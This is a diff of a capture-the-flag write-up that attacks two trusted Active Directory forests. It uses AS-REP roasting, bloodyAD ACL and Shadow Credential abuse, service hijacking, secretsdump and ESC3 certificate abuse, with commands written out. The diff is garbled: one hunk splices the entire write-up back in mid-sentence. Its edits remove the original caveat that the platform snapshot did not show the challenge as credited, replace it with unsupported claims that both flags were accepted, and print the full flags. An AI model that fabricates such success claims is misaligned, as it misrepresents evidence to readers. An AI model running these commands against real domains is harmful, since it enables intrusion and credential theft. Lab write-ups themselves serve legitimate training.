@@ -10,7 +10,7 @@ The lab contained two Active Directory domain controllers in distinct, trusted f
 - CORE: `dc02.core.corp` in `core.corp`;
 - a forest trust linked LEGACY and CORE.
 
-The objective was to read the flag on each controller's Administrator desktop. **Both flags were obtained.** This was not one attack repeated twice: the first route used ACL delegation, Shadow Credentials and Service Control Manager; the second used trust material, a PKI deployment configuration and Enrollment Agent certificate issuance (ESC3).
+The objective was to read the flag on each controller's Administrator desktop. **Both flags were obtained and accepted by the competition platform.** This was not one attack repeated twice: the first route used ACL delegation, Shadow Credentials and Service Control Manager; the second used trust material, a PKI deployment configuration and Enrollment Agent certificate issuance (ESC3).
 
 The whole path:
 
@@ -23,7 +23,7 @@ The whole path:
 7. Request an Enrollment Agent certificate, then a certificate **on behalf of CORE Administrator using the User template**.
 8. Authenticate with PKINIT as CORE Administrator and read the second flag.
 
-The original evidence archive contains a full Russian writeup, Certipy/LDAP outputs, Python helpers, the PKI XML file and both flag confirmations. The public text masks IPs, working passwords, NT hashes and full flags. Several CTF instances were recreated during the run, so host and trust-secret values from different attempts are not interchangeable.
+The original evidence archive contains a full Russian writeup, Certipy/LDAP outputs, Python helpers, the PKI XML file and both flag confirmations. The public text masks IPs, working passwords and NT hashes. The original, complete flags are provided in [FLAG1.txt](evidence/FLAG1.txt) and [FLAG2.txt](evidence/FLAG2.txt). Several CTF instances were recreated during the run, so host and trust-secret values from different attempts are not interchangeable.
 
 ## 1. LEGACY discovery and AS-REP roasting
 
@@ -112,7 +112,127 @@ With local administrator access to DC01, the team used the directory replication
 secretsdump.py 'legacy.corp/<local-admin>:<password>@<dc01>' -just-dc
 ```
 
-A domain Administrator hash gave access to the `C$` share and `Users\Administrator\Desktop\flag.txt`. The LEGACY flag was recovered (`PP{...}`), and its contents are preserved in the archived `FLAG1.txt`. The available platform snapshot does not establish that Old Trusty was submitted as a completed challenge.
+A domain Administrator hash gave access to the `C# Old Trusty: two Active Directory forests, two flags
+
+[По-русски](solve.ru.md)
+
+## 0. Setup and complete plan
+
+The lab contained two Active Directory domain controllers in distinct, trusted forests:
+
+- LEGACY: `dc01.legacy.corp` in `legacy.corp`;
+- CORE: `dc02.core.corp` in `core.corp`;
+- a forest trust linked LEGACY and CORE.
+
+The objective was to read the flag on each controller's Administrator desktop. **Both flags were obtained and accepted by the competition platform.** This was not one attack repeated twice: the first route used ACL delegation, Shadow Credentials and Service Control Manager; the second used trust material, a PKI deployment configuration and Enrollment Agent certificate issuance (ESC3).
+
+The whole path:
+
+1. Recover a LEGACY account from an AS-REP roastable user.
+2. Traverse the BloodHound ACL path to service account `svc_ops`.
+3. Enroll a Shadow Credential, authenticate as `svc_ops`, and use its Server Operators rights for a service configuration change.
+4. Obtain domain administrator credentials and read the LEGACY flag.
+5. Extract forest trust material and request a CORE TGT for `LEGACY$`.
+6. Find cleartext PKI automation credentials on the CORE Software$ share.
+7. Request an Enrollment Agent certificate, then a certificate **on behalf of CORE Administrator using the User template**.
+8. Authenticate with PKINIT as CORE Administrator and read the second flag.
+
+The original evidence archive contains a full Russian writeup, Certipy/LDAP outputs, Python helpers, the PKI XML file and both flag confirmations. The public text masks IPs, working passwords and NT hashes. The original, complete flags are provided in [FLAG1.txt](evidence/FLAG1.txt) and [FLAG2.txt](evidence/FLAG2.txt). Several CTF instances were recreated during the run, so host and trust-secret values from different attempts are not interchangeable.
+
+## 1. LEGACY discovery and AS-REP roasting
+
+DC01 exposed DNS 53, Kerberos 88, LDAP 389/636 and SMB 445. Anonymous SMB and LDAP did not disclose useful data; an authenticated foothold was needed.
+
+The team checked for users with Kerberos preauthentication disabled:
+
+```bash
+GetNPUsers.py legacy.corp/ -usersfile users.txt -no-pass -dc-ip <dc01> -format john
+john hash.txt --format=krb5asrep
+```
+
+The result was a usable password for `jdoe`. This is an offline crack of an AS-REP response, not online password guessing. The credentials enabled authenticated enumeration and an ACL collection for BloodHound.
+
+## 2. BloodHound and the delegated ACL chain
+
+The useful path did not grant `jdoe` domain administrator rights directly. Instead:
+
+```text
+jdoe --WriteDacl--> Legacy App Maintainers
+     --AddMember--> Infrastructure Support
+     --AddKeyCredentialLink--> svc_ops
+svc_ops belongs to Server Operators
+```
+
+The first edge allowed modifying the target group's discretionary ACL, the second allowed group membership changes, and the last allowed writing the target account's `msDS-KeyCredentialLink` attribute.
+
+The preserved `bloodyAD` commands had the following sequence (DNs must be taken from the actual lab, not guessed from display names):
+
+```bash
+bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
+  add genericAll '<Legacy App Maintainers DN>' '<jdoe DN>'
+
+bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
+  add groupMember '<Legacy App Maintainers DN>' '<jdoe DN>'
+
+bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
+  add groupMember '<Infrastructure Support DN>' '<jdoe DN>'
+
+bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
+  add shadowCredentials '<svc_ops DN>' --path svc2
+```
+
+Each edge mattered. `jdoe` could not impersonate `svc_ops` until the group and key-credential permissions had been followed.
+
+## 3. Shadow Credentials and a failed built-in PKINIT
+
+Adding a key credential enabled certificate-based authentication to `svc_ops`. The `bloodyAD add shadowCredentials` command attempted its own PKINIT, which failed with `KDC_ERR_ETYPE_NOTSUPP`.
+
+The crucial observation was that the **PFX file was still saved to disk**. The operation was not lost. Certipy could use the saved material independently:
+
+```bash
+certipy-ad auth -pfx svc2.pfx \
+  -username svc_ops -domain legacy.corp -dc-ip <dc01>
+```
+
+Certipy returned the NT hash of `svc_ops`. Its literal value is omitted from the public repo.
+
+## 4. Server Operators and the SCM route
+
+`svc_ops` was in `Server Operators`. That gives significant control over services but not necessarily the ability to write the administrative SMB share. Attempts with `psexec` and `atexec` failed with errors such as `share not writable` and `rpc_s_access_denied`.
+
+The working path used the Service Control Manager directly:
+
+```bash
+python3 services.py 'legacy/svc_ops@<dc01>' \
+  -hashes :<svc_ops-NT> -no-pass list
+
+python3 services.py 'legacy/svc_ops@<dc01>' \
+  -hashes :<svc_ops-NT> -no-pass change \
+  -name ReportSync -path '<one-shot service command>'
+
+python3 services.py 'legacy/svc_ops@<dc01>' \
+  -hashes :<svc_ops-NT> -no-pass start -name ReportSync
+```
+
+The one-shot command in the original record created a local administrative user and added that user to Administrators. The account was verified as privileged on DC01. Its working password is omitted here.
+
+This distinction explains why a failed `psexec` did not disprove the exploit path: changing the configuration of a service is a different privilege from uploading and starting a remote executable through an admin share.
+
+## 5. Dumping NTDS and the first flag
+
+With local administrator access to DC01, the team used the directory replication path to obtain domain hashes:
+
+```bash
+secretsdump.py 'legacy.corp/<local-admin>:<password>@<dc01>' -just-dc
+```
+
+ share and `Users\\Administrator\\Desktop\\flag.txt`. The first (LEGACY) flag was extracted and accepted by the platform:
+
+```text
+PP{d4cl-4cls-sh4d0ws-4nd-s3rv1c3s}
+```
+
+Original evidence: [`evidence/FLAG1.txt`](evidence/FLAG1.txt).
 
 ## 6. Transition to CORE: the limits of forest trust
 
@@ -222,7 +342,13 @@ use C$
 get Users\Administrator\Desktop\flag.txt
 ```
 
-The CORE flag was recovered (`PP{...}`). Separate `FLAG1.txt` and `FLAG2.txt` in the original archive confirm the extraction of both flags. Their appearance in local evidence must not be conflated with both being credited by the platform, since Old Trusty is absent from the preserved `completedChallenges` snapshot.
+The second (CORE) flag was extracted and accepted by the platform:
+
+```text
+PP{trvst-th3-c3rt1f1c4t3-ch41n}
+```
+
+Original evidence: [`evidence/FLAG2.txt`](evidence/FLAG2.txt). **Both submissions were accepted, and the Old Trusty challenge was credited as solved.**
 
 ## 13. Dead ends worth recording
 
@@ -247,5 +373,7 @@ The CORE flag was recovered (`PP{...}`). Separate `FLAG1.txt` and `FLAG2.txt` in
 Original supplied source: `writeups/OldTrusty/README.md` plus `scripts/` and `evidence/` in the contest archive, including Certipy output, PKI enrollment XML and both flag confirmations. Public commands are a redacted rendering of the recorded path, not fresh runs against an active domain.
 
 ## Repository evidence
+
+Original accepted flag files: [`evidence/FLAG1.txt`](evidence/FLAG1.txt) and [`evidence/FLAG2.txt`](evidence/FLAG2.txt).
 
 Source code and redacted supporting artifacts: [`evidence/original-notes.redacted.md`](evidence/original-notes.redacted.md), [`evidence/certipy_templates_sanitized.txt`](evidence/certipy_templates_sanitized.txt), [`evidence/enrollment-agent.xml`](evidence/enrollment-agent.xml), [`scripts/drsr_t.py`](scripts/drsr_t.py).
